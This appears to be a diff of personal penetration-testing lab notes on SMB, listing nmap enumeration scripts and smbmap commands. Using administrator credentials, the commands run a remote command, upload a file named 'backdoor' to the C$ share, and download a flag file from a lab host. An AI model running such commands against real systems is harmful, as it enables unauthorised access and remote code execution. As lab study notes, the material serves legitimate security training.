@@ -11,15 +11,14 @@ nmap -p445 --script smb-server-stats --script-args
 nmap -p445 --script smb-enum-domains --script-args #Enumerating available domains on a target machine.
 
 
-
+SMB
 smbmap -u guest -p "" -d . -H 10.0.28.123 #Running smbmap tool to discover all shared folders and drives.We will find all the shared folders using a guest user account.
 smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123 #Running smbmap with administrator user credentials.
 smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig' #: Execute the command on the target machine through SMB.
 smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L #Listing all drives on the specified host
-smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' # Uploading a sample file touch backdoor'C$\backdoor
-smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$ #brows directory 
-smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download  #Download the flag.txt file.
-
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor' # Uploading a sample file touch backdoor'C$\backdoor
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$' #brows directory 
+smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt #Download the flag.txt file.
 
 
 windows mount and umount 
